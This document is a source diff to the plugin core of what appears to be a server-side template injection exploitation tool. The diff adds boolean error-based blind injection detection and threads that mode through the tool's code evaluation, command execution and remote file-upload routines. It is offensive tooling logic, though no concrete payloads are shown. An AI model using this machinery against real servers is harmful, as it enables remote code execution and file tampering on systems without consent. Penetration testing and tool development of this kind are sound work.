@@ -1,12 +1,12 @@
 from utils.strings import chunk_seq, md5
 from utils import rand, config
 from utils.loggers import log
+from core.matcher import match
 import re
 import itertools
 import base64
 import collections
 import threading
-import time
 import sys
 
 loaded_plugins = {}
@@ -218,6 +218,20 @@ class Plugin(object):
                     self.rendered_detected()
 
             # Time-based blind technique
+            elif technique == 'B' and self.channel.boolean_enabled:
+                self._detect_blind(variant="boolean")
+                if self.get('boolean'):
+                    log.log(24, f'{self.plugin} plugin has confirmed boolean error-based blind injection')
+                    # Clean up any previous unreliable render data
+                    self.delete('unreliable_render')
+                    self.delete('unreliable')
+                    # Set basic info
+                    self.set('engine', self.plugin.lower())
+                    self.set('language', self.language)
+                    # Set the environment
+                    self.blind_detected()
+
+            # Time-based blind technique
             elif technique == 'T':
                 self._detect_blind()
                 if self.get('blind'):
@@ -294,8 +308,8 @@ class Plugin(object):
     """
     Detection of the rendering tag and context.
     """
-    def _detect_blind(self):
-        action = self.actions.get('blind', {})
+    def _detect_blind(self, variant="blind"):
+        action = self.actions.get(variant, {})
         payload_true = action.get('test_bool_true')
         payload_false = action.get('test_bool_false')
         call_name = action.get('call', 'inject')
@@ -303,38 +317,48 @@ class Plugin(object):
         if not action or not payload_true or not payload_false or not call_name or not hasattr(self, call_name):
             return
         # Print what it's going to be tested
-        log.log(23, f'{self.plugin} plugin is testing time-based blind injection')
+        log.log(23, f'{self.plugin} plugin is testing '
+                    f'{"time" if variant=="blind" else "boolean error"}-based blind injection')
+        kwarg = {variant: True}
         for prefix, suffix, wrapper in self._generate_contexts():
             # Conduct a true-false test
-            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True):
+            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                 continue
-            detail = {'blind_true': self._inject_verbose}
-            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True):
+            detail = {f'{variant}_true': self._inject_verbose}
+            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                 continue
-            detail['blind_false'] = self._inject_verbose
-            detail['average'] = sum(self.render_req_tm) / len(self.render_req_tm)
+            detail[f'{variant}_false'] = self._inject_verbose
             # We can assume here blind is true
-            log.log(28, f'{self.plugin} plugin has detected possible time-based blind injection')
-            self.set('blind_test', True)
+            log.log(28, f'{self.plugin} plugin has detected possible '
+                        f'{"time" if variant=="blind" else "boolean error"}-based blind injection')
+            self.set(f'{variant}_test', True)
+            if variant == 'blind':
+                detail['average'] = sum(self.render_req_tm) / len(self.render_req_tm)
+            elif variant == 'boolean':
+                payload_true = action.get('verify_bool_true')
+                payload_false = action.get('verify_bool_false')
             # Conduct a true-false test again with bigger delay
-            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True):
-                self.set('blind_test', False)
-                log.log(25, f'Possible time-based blind injection turned out to be false positive')
+            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
+                self.set(f'{variant}_test', False)
+                log.log(25, f'Possible {"time" if variant=="blind" else "boolean error"}'
+                            f'-based blind injection turned out to be false positive')
                 continue
-            detail = {'blind_true': self._inject_verbose}
-            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True):
-                self.set('blind_test', False)
-                log.log(25, f'Possible time-based blind injection turned out to be false positive')
+            detail[f'{variant}_true_verify'] = self._inject_verbose
+            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
+                self.set(f'{variant}_test', False)
+                log.log(25, f'Possible {"time" if variant=="blind" else "boolean error"}'
+                            f'-based blind injection turned out to be false positive')
                 continue
-            self.set('blind_test', False)
-            detail['blind_false'] = self._inject_verbose
-            detail['average'] = sum(self.render_req_tm) / len(self.render_req_tm)
-            self.set('blind', True)
+            self.set(f'{variant}_test', False)
+            detail[f'{variant}_false_verify'] = self._inject_verbose
+            if variant == 'blind':
+                detail['average_verify'] = sum(self.render_req_tm) / len(self.render_req_tm)
+            self.set(variant, True)
             self.set('prefix', prefix)
             self.set('suffix', suffix)
             self.set('wrapper', wrapper)
             self.set('wrapper_type', 'local')  # Should always work as a fallback for blind
-            self.channel.detected('blind', detail)
+            self.channel.detected(variant, detail)
             return
 
     """
@@ -381,30 +405,32 @@ class Plugin(object):
         prefix = kwargs.get('prefix', self.get('prefix', ''))
         suffix = kwargs.get('suffix', self.get('suffix', ''))
         wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
-        blind = kwargs.get('blind', False)
+        blind = kwargs.get('blind', self.get('blind', False))
+        boolean = kwargs.get('boolean', self.get('boolean', False))
         injection = prefix + wrapper.format(code=code) + suffix
         log.debug(f'[request {self.plugin}] {repr(self.channel.url)}')
         # If the request is blind
         if blind:
             expected_delay = self._get_expected_delay()
-            start = int(time.time())
-            self.channel.req(injection)
-            end = int(time.time())
-            delta = end - start
+            text, delta, vector = self.channel.req(injection)
             result = delta >= expected_delay
-            log.debug(f'[blind {self.plugin}] code above took {str(delta)} ({str(end)}-{str(start)}). '
-                      f'{str(expected_delay)} is the threshold, returning {str(result)}')
-            self._inject_verbose = {'result': result, 'payload': injection, 'expected_delay': expected_delay,
-                                    'start': start, 'end': end}
+            log.debug(f'[blind {self.plugin}] request took {delta}. '
+                      f'{expected_delay} is the threshold, returning {result}')
+            self._inject_verbose = {'result': result, 'payload': injection, 'expected_delay': expected_delay}
+            return result
+        elif boolean:
+            text, delta, vector = self.channel.req(injection)
+            result = match(self.channel, vector)
+            log.debug(f'[boolean {self.plugin}] request returned {vector}. '
+                      f'{self.channel.page_vector} is expected, returning {str(result)}')
+            self._inject_verbose = {'result': result, 'payload': injection, 'vector': vector,
+                                    'expected': self.channel.page_vector, 'profile': self.channel.page_profile}
             return result
         else:
-            start = int(time.time())
-            result = self.channel.req(injection)
-            end = int(time.time())
+            text, delta, vector = self.channel.req(injection)
             # Append the execution time to a buffer
-            delta = end - start
             self.render_req_tm.append(delta)
-            return result.strip() if result else result
+            return text.strip() if text else text
 
     """
     Inject the rendered payload and get the result.
@@ -457,6 +483,7 @@ class Plugin(object):
         wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
         wrapper_type = kwargs.get('wrapper_type', self.get('wrapper_type', 'local'))
         blind = kwargs.get('blind', False)
+        boolean = kwargs.get('boolean', False)
         if wrapper_type == "local":
             injection = wrapper.format(code=header) + wrapper.format(code=payload) + wrapper.format(code=trailer)
         elif wrapper_type == "global":
@@ -475,8 +502,9 @@ class Plugin(object):
         # Save the average HTTP request time of rendering in order
         # to better tone the blind request timeouts.
         # Reset wrapper to empty, as it was already applied
-        result_raw = self.inject(code=injection, prefix=prefix, suffix=suffix, blind=blind, wrapper="{code}")
-        if blind:
+        result_raw = self.inject(code=injection, prefix=prefix, suffix=suffix,
+                                 blind=blind, boolean=boolean, wrapper="{code}")
+        if blind or boolean:
             return result_raw
         else:
             result = ''
@@ -590,9 +618,9 @@ class Plugin(object):
         if not action or not payload_write or not payload_truncate or not call_name or not hasattr(self, call_name):
             return
         # Check existence and overwrite with --force-overwrite
-        if self.get('blind') or self.md5(remote_path):
+        if self.get('blind') or self.get('boolean') or self.md5(remote_path):
             if not self.channel.args.get('force_overwrite'):
-                if self.get('blind'):
+                if self.get('blind') or self.get('boolean'):
                     log.log(25, 'Blind upload might overwrite files, run with --force-overwrite to continue')
                 else:
                     log.log(25, 'Remote file already exists, run with --force-overwrite to overwrite')
@@ -613,7 +641,7 @@ class Plugin(object):
             }
             execution_code = payload_write.format(path=remote_path, chunk_b64=chunk_b64, chunk_b64p=chunk_b64p, lens=lens)
             getattr(self, call_name)(code=execution_code)
-        if self.get('blind'):
+        if self.get('blind') or self.get('boolean'):
             log.log(25, 'Blind upload can\'t check the upload correctness, check manually')
         elif not md5(data) == self.md5(remote_path):
             log.log(25, 'Remote file md5 mismatch, check manually')
@@ -626,9 +654,12 @@ class Plugin(object):
         wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
         blind = kwargs.get('blind', False)
         error = kwargs.get('error', self.get('error', False))
+        boolean = kwargs.get('boolean', self.get('boolean', False))
         action = self.actions.get('evaluate', {}).copy()
         if error and 'evaluate_error' in self.actions:
             action.update(self.actions.get('evaluate_error', {}))
+        #if boolean and 'evaluate_boolean' in self.actions:
+        #    action.update(self.actions.get('evaluate_boolean', {}))
         payload = action.get('evaluate')
         call_name = action.get('call', 'render')
         # Skip if something is missing or call function is not set
@@ -646,7 +677,8 @@ class Plugin(object):
             'clen64p': len(code_b64p)
         }
         execution_code = payload.format(code_b64=code_b64, code=code, code_b64p=code_b64p, lens=lens)
-        result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=blind)
+        result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
+                                          wrapper=wrapper, blind=blind, boolean=boolean)
         if type(result) == str:
             exfiltrate = action.get('exfiltrate', 'plain')
             if exfiltrate == 'base64':
@@ -662,9 +694,12 @@ class Plugin(object):
         wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
         blind = kwargs.get('blind', False)
         error = kwargs.get('error', self.get('error', False))
+        boolean = kwargs.get('boolean', self.get('boolean', False))
         action = self.actions.get('execute', {}).copy()
         if error and 'execute_error' in self.actions:
             action.update(self.actions.get('execute_error', {}))
+        #if boolean and 'execute_boolean' in self.actions:
+        #    action.update(self.actions.get('execute_boolean', {}))
         payload = action.get('execute')
         call_name = action.get('call', 'render')
         # Skip if something is missing or call function is not set
@@ -682,7 +717,8 @@ class Plugin(object):
             'clen64p': len(code_b64p)
         }
         execution_code = payload.format(code_b64=code_b64, code_b64p=code_b64p, code=code, lens=lens)
-        result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=blind)
+        result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
+                                          wrapper=wrapper, blind=blind, boolean=boolean)
         if type(result) == str:
             result = result.replace('\\n', '\n').replace('<br>', '\n')
             exfiltrate = action.get('exfiltrate', 'plain')
@@ -698,7 +734,10 @@ class Plugin(object):
         suffix = kwargs.get('suffix', self.get('suffix', ''))
         wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
         blind = kwargs.get('blind', False)
+        boolean = kwargs.get('boolean', self.get('boolean', False))
         action = self.actions.get('evaluate_blind', {})
+        if boolean and 'evaluate_boolean' in self.actions:
+            action.update(self.actions.get('evaluate_boolean', {}))
         payload_action = action.get('evaluate_blind')
         call_name = action.get('call', 'inject')
         # Skip if something is missing or call function is not set
@@ -719,14 +758,18 @@ class Plugin(object):
         }
         execution_code = payload_action.format(code_b64=code_b64, lens=lens,
                                                code_b64p=code_b64p, code=code, delay=expected_delay)
-        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True)
+        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
+                                        wrapper=wrapper, blind=blind, boolean=boolean)
 
     def execute_blind(self, code, **kwargs):
         prefix = kwargs.get('prefix', self.get('prefix', ''))
         suffix = kwargs.get('suffix', self.get('suffix', ''))
         wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
         blind = kwargs.get('blind', False)
+        boolean = kwargs.get('boolean', self.get('boolean', False))
         action = self.actions.get('execute_blind', {})
+        if boolean and 'execute_boolean' in self.actions:
+            action.update(self.actions.get('execute_boolean', {}))
         payload_action = action.get('execute_blind')
         call_name = action.get('call', 'inject')
         # Skip if something is missing or call function is not set
@@ -747,7 +790,8 @@ class Plugin(object):
         }
         execution_code = payload_action.format(code_b64=code_b64, lens=lens,
                                                code_b64p=code_b64p, code=code, delay=expected_delay)
-        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True)
+        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
+                                        wrapper=wrapper, blind=blind, boolean=boolean)
 
     def _get_expected_delay(self):
         # Get current average timing for render() HTTP requests
